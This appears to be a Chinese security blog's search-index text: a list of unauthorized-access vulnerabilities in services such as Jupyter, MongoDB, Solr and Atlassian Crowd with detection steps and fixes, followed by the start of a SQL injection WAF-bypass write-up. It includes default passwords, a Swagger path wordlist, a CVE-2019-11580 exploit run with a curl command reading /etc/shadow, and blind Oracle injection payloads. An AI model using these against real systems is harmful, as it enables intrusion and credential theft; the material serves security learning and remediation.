","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:18:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#16-kubernetes-api-server-未授权808010250"},{"categories":["学习"],"content":" 17. Active MQ 未授权访问（8161）漏洞简介 ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。 漏洞检测 默认端口：8161 默认密码：admin/admin 漏洞修复 针对未授权访问，可修改conf/jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务即可。 针对弱口令，可修改conf/jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务即可。 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:19:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#17-active-mq-未授权访问8161"},{"categories":["学习"],"content":" 18. Jupyter Notebook 未授权访问（8888）漏洞简介 Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。 漏洞检测 使用vulhub搭建漏洞演示环境 cd /vulhub/jupyter/notebook-rce docker-compose up -d 端口扫描 访问http://your-ip:8888，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。 选择 new -\u003e terminal 即可创建一个控制台： 直接执行任意命令： 漏洞修复 开启身份验证，防止未经授权用户访问； 访问控制策略，限制IP访问，绑定固定IP； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:20:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#18-jupyter-notebook-未授权访问8888"},{"categories":["学习"],"content":" 19. Elasticsearch 未授权访问（9200、9300）漏洞简介 Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。 漏洞检测 端口扫描 浏览器访问测试命令 http://localhost:9200 http://localhost:9200/_cat/ http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //查看数据库敏感信息 http://localhost:9200/_nodes //查看节点数据 如有安装head插件： http://localhost:9200/_plugin/head/ //web管理界面 漏洞修复 访问控制策略，限制IP访问，绑定固定IP； 在config/elasticsearch.yml中为9200端口设置认证等； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:21:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#19-elasticsearch-未授权访问92009300"},{"categories":["学习"],"content":" 20. Zabbix 未授权访问（10051）漏洞简介 zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。 漏洞检测 端口扫描 无需账户密码直接访问zabbix页面 漏洞修复 设置zabbix的复杂口令，不要用默认口令或弱口令，禁用guest登录功能； zabbix的server和agent都不要以root启动，不要设置AllowRoot=1； 禁止agent执行run，不要设置EnableRemoteCommands=1； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:22:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#20-zabbix-未授权访问10051"},{"categories":["学习"],"content":" 21. Memcached 未授权访问（11211）漏洞简介 Memcached 端口对外开放并且没有配置认证选项，未授权用户可直接获取数据库中所有信息，造成严重的信息泄露。 漏洞检测 端口扫描 无需用户名密码，可以直接连接memcache 服务的11211端口 telnet 10.10.4.89 11211 # 或者 nc -vv 11211 使用了 stats 命令来输出 Memcached 服务信息 漏洞修复 修改绑定的IP、端口和指定访问者IP； 设置防火墙策略； 禁止暴露在公网； 配置memcached监听本地回环地址 127.0.0.1； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:23:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#21-memcached-未授权访问11211"},{"categories":["学习"],"content":" 22. RabbitMQ 未授权访问（15672、15692、25672）漏洞简介 RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。 漏洞检测 端口扫描 浏览器访问测试 默认账号密码都是guest http://10.10.4.89:15672 http://10.10.4.89:15692 http://10.10.4.89:25672 漏洞修复 修改为强密码，删除默认的账号guest； 禁止对外网开放，仅限于内部访问； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:24:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#22-rabbitmq-未授权访问156721569225672"},{"categories":["学习"],"content":" 23. MongoDB 未授权访问（27017）漏洞简介 开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。 造成未授权访问的根本原因就在于启动 Mongodb 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器。 漏洞检测 端口扫描 kali安装mongodb，然后直接连接到服务。 yum install mongodb mongo --host 10.2.20.34 --port 27017 漏洞修复 限制绑定IP，启动时加入参数–bind_ip 127.0.0.1或在/etc/mongodb.conf文件中添加以下内容：bind_ip = 127.0.0.1； 在system.users中添加用户，启动认证； 设置防火墙策略，限定 IP 访问服务； 禁用HTTP和REST端口，修改配置文件或在启动的时候选择参数nohttpinterface=false； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:25:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#23-mongodb-未授权访问27017"},{"categories":["学习"],"content":" 24. NFS 未授权访问（2049、20048）漏洞简介 Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏。 漏洞检测 端口扫描 nfs linux安装nfs客户端 apt install nfs-common 查看nfs服务器上的共享目录 showmount -e 192.168.126.130 挂载相应共享目录到本地 mount -t nfs 192.168.126.130:/grdata /mnt #卸载目录 umount /mnt 漏洞修复 利用iptables限制端口2049和20048端口的访问，禁止外部访问； 设置/etc/exports，对访问进行控制； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:26:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#24-nfs-未授权访问204920048"},{"categories":["学习"],"content":" 25. Dubbo 未授权访问（28096）漏洞简介 Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞。 漏洞检测 端口扫描 连接进入dubbo 服务，进行操作 telent IP port 漏洞修复 配置dubbo认证； 设置防火墙策略，限定IP访问； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:27:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#25-dubbo-未授权访问28096"},{"categories":["学习"],"content":" 26. Druid 未授权访问漏洞简介 Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。 漏洞检测 直接在网站的url中后加上： /druid/index.htm /druid/websession.htm /druid/datasource.htm /druid/sql.htm /druid/spring.html 如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞 漏洞修复 配置访问账号密码； 禁止对外网开放访问； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:28:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#26-druid-未授权访问"},{"categories":["学习"],"content":" 27. Solr 未授权访问漏洞简介 Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell。 漏洞检测 敏感目录扫描时加上一条 /solr/admin http://xx.xx.com/solr/admin https://xx.xx.com/solr/admin 漏洞修复 配置solr访问控制权限； 禁止将solr暴露在公网； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:29:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#27-solr-未授权访问"},{"categories":["学习"],"content":" 28. SpringBoot Actuator 未授权访问漏洞简介 Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。 漏洞检测 直接访问相关路径： http://10.2.20.48/actuator/autoconfig http://10.2.20.48/actuator/env http://10.2.20.48/actuator/dump http://10.2.20.48/actuator/headdump actuator未直接部署在IP根目录下 使用burpsuite的插件：APIKit 介绍：https://www.bilibili.com/read/cv15912732 介绍：https://blog.csdn.net/qq_50854790/article/details/122894291 漏洞修复 禁用/env接口； 升级到SpringBoot Actuator 2.0； 禁止对外开放； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:30:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#28-springboot-actuator-未授权访问"},{"categories":["学习"],"content":" 29. SwaggerUI未授权访问漏洞背景 Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。 漏洞检测 可利用未授权访问漏洞，直接访问以下链接： 漏洞检测 可利用未授权访问漏洞，直接访问以下链接（目录遍历） /api /api-docs /api-docs/swagger.json /api.html /api/api-docs /api/apidocs /api/doc /api/swagger /api/swagger-ui /api/swagger-ui.html /api/swagger-ui.html/ /api/swagger-ui.json /api/swagger.json /api/swagger/ /api/swagger/ui /api/swagger/ui/ /api/swaggerui /api/swaggerui/ /api/v1/ /api/v1/api-docs /api/v1/apidocs /api/v1/swagger /api/v1/swagger-ui /api/v1/swagger-ui.html /api/v1/swagger-ui.json /api/v1/swagger.json /api/v1/swagger/ /api/v2 /api/v2/api-docs /api/v2/apidocs /api/v2/swagger /api/v2/swagger-ui /api/v2/swagger-ui.html /api/v2/swagger-ui.json /api/v2/swagger.json /api/v2/swagger/ /api/v3 /apidocs /apidocs/swagger.json /doc.html /docs/ /druid/index.html /graphql /libs/swaggerui /libs/swaggerui/ /spring-security-oauth-resource/swagger-ui.html /spring-security-rest/api/swagger-ui.html /sw/swagger-ui.html /swagger /swagger-resources /swagger-resources/configuration/security /swagger-resources/configuration/security/ /swagger-resources/configuration/ui /swagger-resources/configuration/ui/ /swagger-ui /swagger-ui.html /swagger-ui.html#/api-memory-controller /swagger-ui.html/ /swagger-ui.json /swagger-ui/swagger.json /swagger.json /swagger.yml /swagger/ /swagger/index.html /swagger/static/index.html /swagger/swagger-ui.html /swagger/ui/ /Swagger/ui/index /swagger/ui/index /swagger/v1/swagger.json /swagger/v2/swagger.json /template/swagger-ui.html /user/swagger-ui.html /user/swagger-ui.html/ /v1.x/swagger-ui.html /v1/api-docs /v1/swagger.json /v2/api-docs /v3/api-docs swagger-ui未直接部署在IP根目录下 使用burpsuite的插件：APIKit 介绍：https://www.bilibili.com/read/cv15912732 介绍：https://blog.csdn.net/qq_50854790/article/details/122894291 修复方法 设置访问权限 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:31:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#29-swaggerui未授权访问漏洞"},{"categories":["学习"],"content":" 30. Harbor未授权添加管理员漏洞Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库。 漏洞地址：http://10.101.20.111/harbor/sign-in 成功添加用户，账号coco密码coco1234 成功接管harbor镜像仓库 安全建议 尽快升级到安全版本，下载链接参考： https://github.com/goharbor/harbor/releases ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:32:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#30-harbor未授权添加管理员漏洞"},{"categories":["学习"],"content":" 31. Windows ipc共享未授权访问漏洞 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:33:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#31-windows-ipc共享未授权访问漏洞"},{"categories":["学习"],"content":" 32. 宝塔phpmyadmin未授权访问漏洞简介 宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞 phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。 漏洞检测 目录扫描：/pma 或者 /phpmyadmin 漏洞URL：http://ip:888/pma 即可直接登录（但要求必须安装了phpmyadmin） 漏洞修复 更新宝塔phpmyadmin为最新版本 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:34:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#32-宝塔phpmyadmin未授权访问"},{"categories":["学习"],"content":" 33. WordPress未授权访问漏洞漏洞复现 可参考 https://www.cnblogs.com/bflw/p/12342845.html ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:35:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#33-wordpress未授权访问漏洞"},{"categories":["学习"],"content":" 34. Atlassian Crowd 未授权访问漏洞简介 Atlassian Crowd是一套基于Web的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。 Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了pdkinstall开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执行任意代码/命令，从而获得服务器权限。 漏洞检测 漏洞利用脚本github地址：https://github.com/jas502n/CVE-2019-11580 git clone https://github.com/jas502n/CVE-2019-11580 cd CVE-2019-11580/ python CVE-2019-11580.py http://192.168.18.138:8095 curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow 漏洞修复 设置访问/crowd/admin/uploadplugin.action的源ip。 升级最新版本(3.5.0以上)。 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:36:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#34-atlassian-crowd-未授权访问"},{"categories":["学习"],"content":" 35. PHP-FPM Fastcgi未授权访问漏洞详情请见：https://www.freebuf.com/articles/web/278245.html（第25条） ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:37:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#35-php-fpm-fastcgi未授权访问漏洞"},{"categories":["学习"],"content":" 36. uWSGI未授权访问漏洞详情请见：https://www.freebuf.com/articles/web/278245.html （第27条） ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:38:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#36-uwsgi未授权访问漏洞"},{"categories":["学习"],"content":" 37. Kong未授权访问漏洞(CVE-2020-11710)环境部署 略。 漏洞复现 复现可参考https://xz.aliyun.com/t/7631 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:39:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#37-kong未授权访问漏洞cve-2020-11710"},{"categories":["学习"],"content":" 38. ThinkAdminV6未授权访问漏洞环境部署 略。 漏洞复现 可参考 https://www.cnblogs.com/cn-gov/p/13715861.html ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:40:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#38-thinkadminv6未授权访问漏洞"},{"categories":["学习"],"content":" 归纳补充本人补充：批量检测漏洞思路（史上最经典） 批量探测默认端口 对于拼接字符串检测的未授权漏洞，使用自定义字典进行批量目录扫描，查看状态码。对于正常响应的，可以批量进行浏览器访问测试（工具：http://www.ab173.com/zhanzhang/openurls.php） —— 方便开展专项排查工作。 赠人玫瑰手有余香。 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:41:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#归纳补充"},{"categories":["学习"],"content":" 参考文章 二十九种未授权访问漏洞合集，真的很全面 https://www.sohu.com/a/551258460_121349997 超全面未授权访问漏洞复现合集 （含：测试环境部署 和 进一步漏洞利用） https://www.freebuf.com/articles/web/278245.html ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:42:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#参考文章"},{"categories":["学习"],"content":" 转载自： https://forum.butian.net/share/3692 ","date":"2024-09-02","objectID":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["SRC"],"title":"比较有意思的几个漏洞挖掘记录","uri":"/%E6%AF%94%E8%BE%83%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/#"},{"categories":["学习"],"content":" sql 注入某条数据，点击详情的数据包，单引号报错 再加一个正常 本以为是一次平平无奇的 sql 注入，没想到绕了一天才绕过去，下面放几张测试失败的截图 首先就是 404，不知道规则是啥样的，下面语句应该是没问题的就会 404,1=1 让语句不通就会 500 试了下 orcale 的注入方法，又爆 403，这里’||55||‘会返回空数据，’||1/0||‘会爆 500，这里判断语句能想到的都试了，全 403，最奇怪的是只有语句正确才会 403，少写一个 D 就会 500，不知道这什么匹配逻辑，不过试了一些插入空白字符啥的也都不行 这里我又跑了一遍字典，全 404、500、403，期间尝试结合分块传输、参数污染、垃圾数据、白名单、高并发均未绕过去 最终经过我的不断测试,插入下面 payload 回显特别慢，最终显示数据量太大，不过 in 这个关键字我理解的不是很透彻，有懂的师傅可以解答下 'OR+1+in+1+and+'a'+in+'a 当 1 in 5 的时候整个结果为 false，返回为空 直接注下 user 的长度 'OR+1+in+length(user)+and+'a'+in+'a 只有相等时会卡死，很明显为 7 位 直接用 instr 函数注用户名 'OR+1+in+instr(user,'u')+and+'a'+in+'a instr函数代表后面那个字符在前面字符串第一次出现的位置 例如: instr('user','u')返回1 instr('user','us')返回1 instr('user','s')返回2 第一位为 S 第二位为 H，其他同理 